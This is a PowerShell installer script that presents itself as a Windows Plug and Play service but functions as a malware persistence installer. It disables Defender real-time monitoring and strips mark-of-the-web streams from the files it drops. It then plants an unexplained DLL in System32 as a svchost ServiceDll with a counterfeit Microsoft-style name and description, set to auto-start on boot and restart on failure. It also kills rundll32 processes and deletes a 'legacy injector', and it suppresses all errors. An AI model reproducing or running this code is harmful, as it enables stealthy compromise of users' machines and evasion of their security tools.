# Windows Plug and Play Extensions - Installer (svchost.exe ServiceDll)
# Run as Administrator

$ErrorActionPreference = "SilentlyContinue"
$SYS32    = "$env:SystemRoot\System32"
$DRIVERS  = "$env:SystemRoot\System32\drivers"
$SVC      = "WPnpSvc"
$SVCGROUP = "PnpExtGroup"
$SD       = Split-Path -Parent $MyInvocation.MyCommand.Path

# Check admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[!] Run as Administrator" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Check DLL
if (-not (Test-Path "$SD\pnpext.dll")) {
    Write-Host "[!] pnpext.dll not found in $SD" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "============================================"
Write-Host " Windows PnP Extensions - Setup"
Write-Host "============================================"
Write-Host ""

# 1. Prepare: disable Defender realtime (best-effort)
Write-Host "[1/6] Preparing..." -ForegroundColor Cyan
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Start-Sleep -Seconds 2

# 2. Remove old installation (WPnpSvc or legacy injector)
Write-Host "[2/6] Removing old installation..." -ForegroundColor Cyan
sc.exe stop $SVC 2>$null | Out-Null
Start-Sleep -Seconds 2
sc.exe delete $SVC 2>$null | Out-Null
Stop-Process -Name "rundll32" -Force -ErrorAction SilentlyContinue
# Remove legacy WPnpSvc.exe if present
Remove-Item "$SYS32\WPnpSvc.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$SYS32\spoolcfg.exe" -Force -ErrorAction SilentlyContinue

# 3. Copy files
Write-Host "[3/6] Copying files..." -ForegroundColor Cyan
Remove-Item "$SD\pnpext.dll:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$SD\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyContinue

Copy-Item "$SD\pnpext.dll" "$SYS32\pnpext.dll" -Force
Write-Host "       pnpext.dll  -> $SYS32\" -ForegroundColor Gray
if (Test-Path "$SD\pnpext.sys") {
    Copy-Item "$SD\pnpext.sys" "$DRIVERS\pnpext.sys" -Force
    Write-Host "       pnpext.sys  -> $DRIVERS\" -ForegroundColor Gray
}
Remove-Item "$SYS32\pnpext.dll:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$DRIVERS\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyContinue

# 4. Register svchost group + create service
Write-Host "[4/6] Creating service (svchost.exe ServiceDll)..." -ForegroundColor Cyan

# Register svchost group so svchost.exe -k PnpExtGroup loads our service
$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).$SVCGROUP
if (-not $existing) {
    New-ItemProperty -Path $svchostKey -Name $SVCGROUP -Value @($SVC) -PropertyType MultiString -Force | Out-Null
    Write-Host "       Svchost group '$SVCGROUP' registered" -ForegroundColor Gray
}

# Create the service pointing to svchost.exe
sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Windows Plug and Play Extensions" 2>$null | Out-Null
sc.exe description $SVC "Manages extended Plug and Play device configuration and compatibility" 2>$null | Out-Null
# Failure recovery: restart after 10s, 30s, 60s
sc.exe failure $SVC reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>$null | Out-Null

# 5. Set ServiceDll parameter
Write-Host "[5/6] Configuring ServiceDll..." -ForegroundColor Cyan
$paramPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
New-Item -Path $paramPath -Force | Out-Null
New-ItemProperty -Path $paramPath -Name "ServiceDll" -Value "$SYS32\pnpext.dll" -PropertyType ExpandString -Force | Out-Null
New-ItemProperty -Path $paramPath -Name "ServiceMain" -Value "ServiceMain" -PropertyType String -Force | Out-Null
Write-Host "       ServiceDll = $SYS32\pnpext.dll" -ForegroundColor Gray

# 6. Start service
Write-Host "[6/6] Starting service..." -ForegroundColor Cyan
sc.exe start $SVC 2>$null | Out-Null
Start-Sleep -Seconds 5

# Re-enable Defender
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

# Verify
$svcInfo = sc.exe query $SVC 2>$null | Select-String "RUNNING"
$loaded = & tasklist /m pnpext.dll 2>$null | Select-String "svchost"
Write-Host ""
if ($svcInfo -and $loaded) {
    Write-Host "[+] SUCCESS! Service running in svchost.exe" -ForegroundColor Green
} elseif ($svcInfo) {
    Write-Host "[+] Service running. DLL load may need a few seconds." -ForegroundColor Yellow
} else {
    Write-Host "[?] Service created but not running yet. Try reboot." -ForegroundColor Yellow
}
Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host " Service: $SVC (svchost.exe -k $SVCGROUP)"
Write-Host " DLL:     $SYS32\pnpext.dll"
Write-Host " Config:  $DRIVERS\pnpext.sys"
Write-Host " Auto-start on boot: YES"
Write-Host "============================================" -ForegroundColor Green
Write-Host ""
Read-Host "Press Enter to exit"
